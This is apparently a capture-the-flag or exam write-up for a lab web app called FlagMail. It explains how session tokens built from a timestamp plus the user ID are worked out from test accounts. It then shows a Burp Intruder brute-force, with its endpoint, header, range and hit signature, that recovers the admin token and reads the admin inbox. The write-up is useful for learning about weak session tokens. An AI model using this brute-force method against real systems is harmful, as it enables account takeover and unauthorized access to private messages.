## FlagMail - Insecure Direct Object Reference (IDOR) / Predictable Session Token


> x Exam (20)


### Vulnerability

The application generates session tokens using a predictable formula:

```
token = unix_timestamp_seconds + user_id
```

Example: user `id:2` registered at `1776179108` → token = `1776179108002`

### Workflow

**1. Register a user and observe the token**

- Register via `POST /api/register`
- Response reveals: `token`, `id`, `username`
- Register multiple accounts to confirm the pattern

**2. Identify the token formula**

|id|token|pattern|
|---|---|---|
|3|`1776177240003`|timestamp + `003`|
|4|`1776178083004`|timestamp + `004`|
|5|`1776178091005`|timestamp + `005`|

→ Last 3 digits = user ID

**3. Target admin (id:1)**

- Admin token must end in `001`
- Admin registered before any other user

**4. Brute force in Burp Intruder**

- Endpoint: `GET /api/inbox`
- Header: `Authorization: Bearer §val§001`
- Payload type: Numbers
    - From: `1776179000`
    - To: `1776179107` (just before known user)
    - Step: `1`
    - Max integer digits: `10`
- Payload Processing: Add suffix `001`

**5. Identify the hit**

- All invalid tokens → `401` length `159`
- Valid admin token → `200` length `540`
- Found: `1776179049001`

**6. Read admin inbox**

```
GET /api/inbox
Authorization: Bearer 1776179049001
```

→ Find the confidential message containing the flag



### Burp Suite Setup
<div class="two-col">
<div>

![[burp_suite_intruder_setup.png]]


</div>	
<div>

![[image_burp_intruder.png]]


</div>
</div>

